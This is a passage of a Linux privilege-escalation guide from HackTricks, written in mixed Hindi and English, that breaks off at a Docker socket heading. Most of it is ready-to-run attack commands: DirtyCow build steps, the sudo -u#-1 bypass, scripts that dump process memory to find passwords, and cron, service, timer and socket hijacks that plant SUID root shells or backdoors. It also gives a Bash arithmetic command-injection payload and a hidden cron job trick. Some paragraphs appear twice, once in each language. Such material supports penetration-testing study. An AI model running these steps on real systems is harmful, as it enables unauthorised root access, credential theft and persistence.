# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी प्राप्त करना शुरू करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर write permissions** हैं तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version चेक करें और देखें कि कोई exploit है जो escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel list और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **kernel version को Google में खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

यह देखने के लिए कि इस vuln का शोषण कैसे किया जा सकता है, **smasher2 box of HTB** पर एक **उदाहरण** देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपायों की सूची

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **what is mounted and unmounted**, कहाँ और क्यों। अगर कुछ unmounted है तो आप उसे mount करके निजी जानकारी के लिए जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही, जांचें कि **any compiler is installed**। यह तब उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना हो क्योंकि यह सलाह दी जाती है कि उसे उसी मशीन पर compile किया जाए जहाँ आप उसे उपयोग करने जा रहे हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### इंस्टॉल किया गया असुरक्षित सॉफ़्टवेयर

जाँच करें कि **इंस्टॉल किए गए पैकेज और सेवाओं का संस्करण** क्या है। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे exploited for escalating privileges…\  
सुझाव दिया जाता है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर का संस्करण मैन्युअल रूप से जाँचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS जैसे कुछ applications या समान टूल्स की सिफारिश की जाती है जो जाँच करें कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable है या नहीं_

## Processes

Take a look at **what processes** are being executed and check if any process has **more privileges than it should** (maybe a tomcat being executed by root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
हमीशा यह जांचें कि कोई [**electron/cef/chromium debuggers** चल तो नहीं रहे — इनका दुरुपयोग करके privileges escalate किए जा सकते हैं](electron-cef-chromium-debugger-abuse.md). **Linpeas** इन्हें process की command line के अंदर `--inspect` parameter को चेक करके detect करता है.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.\
साथ ही **processes binaries पर अपनी privileges भी चेक करें**, शायद आप किसी को overwrite कर सकें।

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.\
आप प्रक्रियाओं को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह उन कमजोर प्रक्रियाओं की पहचान करने में बहुत उपयोगी हो सकता है जो बार‑बार execute होती हैं या जब कुछ requirements पूरी होते हैं।

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.\
किसी सर्वर की कुछ services memory के अंदर **credentials को clear text में सेव** करती हैं।\
आम तौर पर अन्य users के processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होती है, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से root हों और और credentials खोजना चाहें।\
हालाँकि, याद रखें कि **एक सामान्य user के रूप में आप उन processes की memory पढ़ सकते हैं जो आपके हैं**।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.\
> ध्यान दें कि आजकल ज्यादातर मशीनों में **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं होती** जिसका मतलब है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते कि उनके पास वही uid हो। यह ptracing के काम करने का पारंपरिक तरीका था।
> - **kernel.yama.ptrace_scope = 1**: केवल एक parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace के साथ किसी भी process को trace नहीं किया जा सकता। एक बार सेट होने पर, ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.\
यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है तो आप Heap निकाल कर उसके अंदर के credentials की खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

दिए गए process ID के लिए, **maps दिखाती है कि उस प्रोसेस में मेमोरी कैसे मैप की जाती है** virtual address space; यह हर mapped region की **permissions भी दिखाती है**। यह **mem** pseudo file **प्रोसेस की मेमोरी को स्वयं उजागर करता है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **मेमोरी क्षेत्र पढ़ने योग्य हैं** और उनके ऑफ़सेट। हम इन जानकारियों का उपयोग करके **mem फ़ाइल में seek करके सभी पढ़ने योग्य क्षेत्रों को dump करके एक फ़ाइल में सेव करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि आभासी मेमोरी तक। कर्नेल के वर्चुअल एड्रेस स्पेस तक /dev/kmem के माध्यम से पहुँच की जा सकती है.\\  
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के Sysinternals टूल सूट के क्लासिक ProcDump टूल की Linux के लिए पुनर्कल्पना है। इसे यहाँ पाएं: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटा कर अपने द्वारा स्वामित्व वाले प्रोसेस को डंप कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### प्रोसेस मेमोरी से क्रेडेंशियल्स

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator प्रोसेस चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शनों को देखें ताकि process की memory dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials की खोज कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) यह **clear text credentials** को memory और कुछ **well known files** से चुरा लेगा। इसे सही तरीके से काम करने के लिए root privileges चाहिए।

| विशेषता                                           | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## शेड्यूल किए गए/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से बाइंड है, तो आप इसे SSH local port-forwarding के माध्यम से अभी भी एक्सेस कर सकते हैं और privesc के लिए एक privileged job बना सकते हैं।

Typical chain
- लूपबैक-ओनली पोर्ट खोजें (e.g., 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ via `ss -ntlp` / `curl -v localhost:8000`
- ऑपरेशनल आर्टिफैक्ट्स में credentials खोजें:
- Backups/scripts जिनमें `zip -P <password>`
- systemd unit जिसमें `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` मौजूद हों
- Tunnel बनाकर login करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (SUID shell छोड़ता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों तक सीमित रखें
- localhost पर बाइंड करें और अतिरिक्त रूप से firewall/VPN के माध्यम से पहुँच सीमित करें; पासवर्ड दोहराकर न प्रयोग करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab के अंदर root user किसी कमांड या स्क्रिप्ट को path सेट किए बिना चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron एक script में wildcard का उपयोग (Wildcard Injection)

यदि कोई script root द्वारा execute किया जाता है और किसी command में “**\***” मौजूद है, तो आप इसे exploit करके अनपेक्षित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **के आगे रखा गया है, तो यह vulnerable नहीं है (यहां तक कि** _**./\***_ **भी नहीं)।**

अधिक wildcard exploitation tricks के लिए निम्नलिखित पृष्ठ पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में फीड करता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute हो जाएगा।

- कारण: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। तो `$(/bin/bash -c 'id > /tmp/pwn')0` जैसा मान पहले substitute होता है (कमांड चलता है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि स्क्रिप्ट बिना errors के आगे चलती रहे।

- सामान्य vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled टेक्स्ट लिखवाएँ ताकि numeric दिखने वाला field एक command substitution रखे और digit पर खत्म हो। सुनिश्चित करें कि आपका कमांड stdout पर कुछ न निकाले (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **root द्वारा execute होने वाले किसी cron script को modify कर सकते हैं**, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी **directory जहाँ आपकी पूर्ण पहुँच है** का उपयोग करता है, तो उस folder को हटाकर और किसी अन्य के लिए एक **symlink folder** बना कर उस पर आपकी नियंत्रित script लगाना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

आप उन प्रोसेस की निगरानी कर सकते हैं ताकि ऐसे प्रोसेस खोजे जा सकें जो हर 1, 2 या 5 मिनट में चल रहे हों। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, यदि आप **1 मिनट के दौरान हर 0.1s पर निगरानी करना**, **कम निष्पादित किए गए कमांड्स के अनुसार छाँटना** और सबसे अधिक निष्पादित कमांड्स को हटाना चाहते हैं, तो आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप यह भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर process को मॉनिटर करेगा और सूचीबद्ध करेगा जो शुरू होता है)।

### अदृश्य cron jobs

एक cronjob बनाया जा सकता है **टिप्पणी के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं, अगर कर सकते हैं, तो आप **इसे संशोधित कर सकते हैं** ताकि यह आपके **backdoor** को **निष्पादित** करे जब सेवा **शुरू**, **पुनरारंभ** या **बंद** हो (शायद आपको मशीन के reboot होने तक इंतजार करना पड़े).\
उदाहरण के लिए अपनी backdoor को `.service` फ़ाइल के अंदर इस तरह बनाएं: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य सेवा बाइनरीज़

ध्यान रखें कि अगर आपके पास सेवाओं द्वारा निष्पादित होने वाली बाइनरीज़ पर **लिखने की अनुमति** है, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ फिर से निष्पादित हों तो backdoors भी निष्पादित हों।

### systemd PATH - सापेक्ष पथ

आप **systemd** द्वारा उपयोग किए गए PATH को निम्न से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं, तो आप **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** जैसी फ़ाइलों की खोज करनी चाहिए:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर एक **executable** बनाइए (जिसमें आप लिख सकते हैं) जिसका नाम **relative path binary** के समान हो, और जब service से कमजोर क्रिया (**Start**, **Stop**, **Reload**) करने के लिए कहा जाएगा, आपका **backdoor निष्पादित होगा** (unprivileged users आमतौर पर services को start/stop नहीं कर पाते, लेकिन जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd unit फाइलें हैं जिनके नाम का अंत `**.timer**` में होता है और जो `**.service**` फाइलों या घटनाओं को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए बिल्ट-इन समर्थन होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> उस Unit को activate करने के लिए जब यह timer समाप्त हो जाता है। आर्गुमेंट एक unit name है, जिसका suffix ".timer" नहीं होता। यदि निर्दिष्ट नहीं किया गया है, तो यह value डिफ़ॉल्ट रूप से उसी नाम वाली service बन जाती है जो timer unit के नाम के समान होती है, सिवाय suffix के। (ऊपर देखें।) अनुशंसित है कि जिस unit का नाम activate होता है और timer unit का नाम एक समान हों, सिवाय suffix के।

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **executing a writable binary**
- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **Timer सक्षम करना**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर उसके लिए symlink बनाकर **सक्रिय** किया जाता है

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल के भीतर एक ही या अलग मशीनों पर **process communication** की अनुमति देते हैं। ये कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**sockets के बारे में अधिक जानें `man systemd.socket` के साथ।** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन सारांश **यह संकेत करने के लिए उपयोग किया जाता है कि यह कहाँ सुनने वाला है** (AF_UNIX socket फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)
- `Accept`: एक boolean तर्क लेता है। यदि **true**, तो प्रत्येक आने वाले कनेक्शन के लिए एक **service instance** spawn किया जाता है और केवल कनेक्शन socket इसे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं स्टार्ट की गई service unit को पास किये जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होती है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक single service unit बिना शर्त सभी आने वाले ट्रैफ़िक को संभालता है। **डिफ़ॉल्ट false है।** प्रदर्शन कारणों से, नए daemons केवल उस तरह लिखा जाना सुझाया जाता है जो `Accept=no` के लिए उपयुक्त हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो listening **sockets**/FIFOs के बने और bind किए जाने से क्रमशः **पहले** या **बाद** execute होते हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, फिर process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के बंद और हटाए जाने से क्रमशः **पहले** या **बाद** execute किये जाते हैं।
- `Service`: incoming traffic पर activate करने के लिए service unit का नाम specify करता है। यह setting केवल Accept=no वाले sockets के लिए allowed है। यह default उस service का नाम होता है जो socket जैसा नाम रखता है (suffix बदलकर)। ज़्यादातर मामलों में, इस option का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

अगर आपको कोई **writable** `.socket` फाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाये जाने से पहले execute हो जाएगा। इसलिए, आपको **शायद मशीन के reboot होने तक इंतज़ार करना होगा।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

यदि आप कोई भी **writable socket** पहचानते हैं (_अब हम Unix Sockets की बात कर रहे हैं न कि config `.socket` फाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets का अनुक्रमण
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो unix sockets के रूप में कार्य कर रही हैं_). आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद किसी **exploit some vulnerability**.

### लिखने योग्य Docker Socket

